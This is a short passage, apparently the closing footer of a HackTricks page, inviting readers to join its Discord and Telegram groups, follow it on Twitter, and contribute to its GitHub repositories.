* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
